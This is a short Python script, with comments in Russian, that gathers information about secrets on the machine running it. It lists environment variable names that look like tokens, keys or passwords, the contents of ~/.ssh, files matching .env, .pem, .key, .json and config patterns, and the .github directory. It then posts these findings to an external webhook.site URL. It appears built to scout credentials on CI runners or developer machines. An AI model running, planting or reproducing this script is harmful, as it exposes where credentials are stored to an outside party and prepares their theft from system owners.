import os
import requests
import subprocess
import glob

WEBHOOK_URL = "https://webhook.site/7c0dc567-3ce3-4b87-8393-1ea64c832f20"

def hunt_secrets():
    findings = {
        "env_keys": [k for k in os.environ.keys() if any(s in k.upper() for s in ['TOKEN', 'SECRET', 'KEY', 'PASS', 'AUTH', 'CRED'])],
        "sensitive_files": [],
        "ssh_files": os.listdir(os.path.expanduser("~/.ssh")) if os.path.exists(os.path.expanduser("~/.ssh")) else []
    }
    
    # Ищем файлы, которые часто содержат секреты
    patterns = ['*.env', '*.pem', '*.key', '*.json', 'config*']
    for pattern in patterns:
        findings["sensitive_files"].extend(glob.glob(f"**/{pattern}", recursive=True))

    # Пытаемся прочитать структуру .github (там часто лежат секретные конфигурации)
    try:
        findings["github_config"] = os.listdir('.github')
    except:
        findings["github_config"] = "access denied"

    requests.post(WEBHOOK_URL, json=findings)

if __name__ == "__main__":
    hunt_secrets()
